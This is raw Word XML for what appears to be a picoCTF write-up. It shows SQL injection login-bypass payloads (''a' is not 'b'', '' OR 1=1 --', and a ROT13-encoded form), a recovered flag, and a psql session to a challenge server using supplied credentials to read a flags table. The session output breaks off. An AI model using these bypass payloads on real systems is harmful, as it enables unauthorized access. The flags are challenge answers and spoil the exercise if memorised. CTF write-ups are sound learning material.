          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D8946FD" w14:textId="4C482FD5" w:rsid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sidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>a' is not 'b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BA2538" w14:textId="1BB5BA82" w:rsidR="00BE6BB7"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 xml:space="preserve">SELECT * FROM admin where password = </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>‘a’ is not ‘b’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085FDD51" w14:textId="308AD5EF" w:rsidR="00BE6BB7" w:rsidRPr="00BE6BB7" w:rsidRDefault="00BE6BB7" w:rsidP="00BE6BB7">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'o</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2805DE21" w14:textId="77777777" w:rsidR="000A0346" w:rsidRDefault="00BE6BB7" w:rsidP="00BE6BB7">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>password=</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE6BB7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">n' </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>vf</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abg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>o&amp;debug</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593DF46F" w14:textId="38D73285" w:rsidR="0026246E" w:rsidRDefault="0026246E" w:rsidP="00BE6BB7">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32B9FD3F" w14:textId="77777777" w:rsidR="0026246E" w:rsidRDefault="0026246E" w:rsidP="00BE6BB7">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4148DD4A" w14:textId="7BA53243" w:rsidR="0026246E"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We can try          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>' OR 1=1 --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D06B530" w14:textId="77777777" w:rsidR="0026246E" w:rsidRDefault="0026246E" w:rsidP="0026246E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0026246E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>SELECT * FROM admin where password = '' or 1=1 --'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14174A49" w14:textId="5C73BEF6" w:rsidR="0026246E" w:rsidRPr="00BE6BB7" w:rsidRDefault="0026246E" w:rsidP="0026246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ROT13 encrypt the payload : </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be</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE6BB7">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B544BA">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>1=1 --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042767CA" w14:textId="77777777" w:rsidR="0026246E" w:rsidRDefault="00B544BA" w:rsidP="00BE6BB7">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B544BA">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>password=' be 1=1 --&amp;debug=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642EFBA8" w14:textId="20BCF9E4" w:rsidR="000A0346" w:rsidRDefault="000A0346" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0CCB52B5" wp14:editId="212A6151">
            <wp:extent cx="6332220" cy="33401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49"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3340100"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8B8D05" w14:textId="1F302846" w:rsidR="00EA3443" w:rsidRDefault="00C15385" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C15385">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C15385">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{3v3n_m0r3_SQL_7f5767f6}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B4800B" w14:textId="32A0CAF0" w:rsidR="00C15385" w:rsidRDefault="00C15385" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51C8C65C" w14:textId="77777777" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="0077303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SQL Direct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6EABB7"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16BE3B5D" w14:textId="77777777" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="0077303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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Exploitationsql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1AF814E3" w14:textId="77777777" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="0077303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 / LT 'SYREAL' JONES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A46017C" w14:textId="04555961" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="0077303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9529D07" w14:textId="04F0604E" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="00773038">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>psql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> -h saturn.picoctf.net -p 53919 -U </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>postgres</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>pico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="14AB3BB9" w14:textId="7352B983" w:rsidR="00773038" w:rsidRPr="00773038" w:rsidRDefault="00773038" w:rsidP="00773038">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Password is </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>postgres</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2AB3D4A7" w14:textId="77777777" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="0077303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Connect to this PostgreSQL server and find the flag!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9621B7" w14:textId="5D3C4EDE" w:rsidR="00C15385" w:rsidRDefault="00773038" w:rsidP="001F4DD4">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Hint: What does a SQL database contain?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAA9215" w14:textId="43B31E00" w:rsidR="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4992AEE8" w14:textId="1B4CCA02" w:rsidR="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BEE6C64" w14:textId="34C124FA" w:rsidR="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76D504C0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65242618"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6D659BC"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psql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> (14.4 (Debian 14.4-1+b1), server 14.2 (Debian 14.2-1.pgdg110+1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583D542B"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"help" for help.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D2CB6A" w14:textId="77777777" w:rsidR="00DB370A" w:rsidRPr="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08D27A87"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help</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB3386E"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You are using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>psql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>, the command-line interface to PostgreSQL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F888DF5" w14:textId="77777777" w:rsidR="00DB370A" w:rsidRPr="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Type:  \copyright for distribution terms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BABA1C"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\h for help with SQL commands</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A82904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 for help with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>psql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> commands</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE6A26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\g or terminate with semicolon to execute query</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F2223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\q to quit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1854B4"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F764F5D" w14:textId="77777777" w:rsidR="00DB370A" w:rsidRPr="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>pico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>=# \d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CF71AF"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List of relations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79492AAD"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Schema | Name  | Type  |  Owner   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F72277"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51F1ED32"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public | </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>flags</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> | table | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>postgres</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="70B44CFB" w14:textId="49257952" w:rsidR="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(1 row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4314A4" w14:textId="217BBAC9" w:rsidR="00773038" w:rsidRDefault="00773038" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FBD3102" w14:textId="77777777" w:rsidR="00DB370A" w:rsidRPr="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180E2279"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>psql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> -h saturn.picoctf.net -p 53919 -U </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>postgres</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>pico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 'select * from flags'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714D427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Password for user </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>postgres</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFBA626"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id | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>firstname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>lastname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DB370A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  |                address                 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4021CE41" w14:textId="77777777" w:rsidR="00DB370A" w:rsidRPr="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00DB370A">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
